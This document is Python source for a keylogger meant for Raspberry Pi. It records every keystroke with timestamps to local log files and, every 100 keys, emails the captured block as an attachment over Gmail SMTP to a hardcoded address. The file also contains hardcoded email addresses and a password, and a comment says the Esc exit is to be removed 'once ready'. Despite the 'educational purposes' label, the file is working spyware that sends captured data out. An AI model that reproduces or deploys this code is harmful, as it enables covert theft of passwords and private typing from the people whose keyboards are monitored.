##############################################################
####Python Key-Logger Compatible with Raspberry Pi Devices####
#################Developed by Nathan Clark####################
###############For Educational Purposes Only##################
##############################################################

import datetime
import os
import smtplib

from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

numKeys = 0
keys = []
total_keys = 0
block_ID = 0
print(datetime.datetime.now())

sender_email = "jjthejettrain12@gmail.com"
password = "password 123"
receiver_email = "nathan.p.clark00@gmail.com"


def on_press(key):
    global keys, numKeys, total_keys

    keys.append(key)  # Key pressed gets added to end of keys list
    numKeys += 1
    total_keys += 1

    print("{0} pressed {1} block_ID = {2}".format(key, total_keys, block_ID))

    if numKeys >= 1:  # Number of keys needed before file saves
        numKeys = 0
        write_file(keys)  # Calls write_file function
        keys = []  # Resetting keys list per key


def write_file(keys_to_file):
    global block_ID

    if master_log_check():  # checks if master log has been created already
        with open("masterLog.txt", "a") as master:
            for write_file_key in keys_to_file:
                t = datetime.datetime.now()

                k = str(write_file_key).replace("'", "")  # k is the new key without ' '

                if k.find("space") > 0:
                    master.write('\n')
                elif k.find("Enter") > 0:
                    master.write(t.strftime("%a, %b %d, %Y"))
                    master.write("Enter")
                    master.write('\n')
                elif k.find("Keys") == -1:
                    master.write(t.strftime("%m-%d-%y %H:%M:%S "))
                    master.write(k)
                    master.write('\n')
    else:
        with open("masterLog.txt", "w") as master:
            for write_file_key in keys_to_file:
                t = datetime.datetime.now()

                k = str(write_file_key).replace("'", "")  # k is the new key without ' '

                if k.find("space") > 0:
                    master.write('\n')
                elif k.find("Enter") > 0:
                    master.write(t.strftime("%a, %b %d, %Y"))
                    master.write("Enter")
                    master.write('\n')
                elif k.find("Keys") == -1:
                    master.write(t.strftime("%m-%d-%y %H:%M:%S "))
                    master.write(k)
                    master.write('\n')

    if os.path.isfile("block{}.txt".format(block_ID)):  # checks if current block file exists already
        with open("block{}.txt".format(block_ID), "a") as f:  # f is used for accessing the file data
            for write_file_key in keys_to_file:
                t = datetime.datetime.now()

                k = str(write_file_key).replace("'", "")  # k is the new key without ' '

                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Enter") > 0:
                    f.write(t.strftime("%a, %b %d, %Y"))
                    f.write("Enter")
                    f.write('\n')
                elif k.find("Keys") == -1:
                    f.write(t.strftime("%m-%d-%y %H:%M:%S "))
                    f.write(k)
                    f.write('\n')

                if total_keys % 100 == 0:
                    block_ID += 1
                    send_email()

    else:
        with open("block{}.txt".format(block_ID), "w") as f:
            for write_file_key in keys_to_file:
                t = datetime.datetime.now()

                k = str(write_file_key).replace("'", "")  # k is the new key without ' '

                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Enter") > 0:
                    f.write(t.strftime("%a, %b %d, %Y"))
                    f.write("Enter")
                    f.write('\n')
                elif k.find("Keys") == -1:
                    f.write(t.strftime("%m-%d-%y %H:%M:%S "))
                    f.write(k)
                    f.write('\n')

                if total_keys % 100 == 0:
                    send_email()
                    block_ID += 1


def on_release(key):  # remove this once ready
    if key == Key.esc:
        return False


def send_email():

    message = MIMEMultipart()

    message["From"] = sender_email
    message['To'] = receiver_email
    message['Subject'] = "Keys"

    file = "block{0}.txt".format(block_ID - 1)
    attachment = open(file, 'r')

    obj = MIMEBase('application', 'octet-stream')

    obj.set_payload(attachment.read())
    encoders.encode_base64(obj)
    obj.add_header('Content-Disposition', "attachment; filename= " + file)

    message.attach(obj)
    my_message = message.as_string()

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender_email, password)
    print("---Login success---")
    server.sendmail(sender_email, receiver_email, my_message)
    print("---Email sent successfully---")


def master_log_check():
    if os.path.isfile("masterLog.txt"):
        return True
    else:
        return False


# Creates a Listener and runs it in infinite loop
with Listener(on_press=on_press, on_release=on_release) as Listener:
    Listener.join()
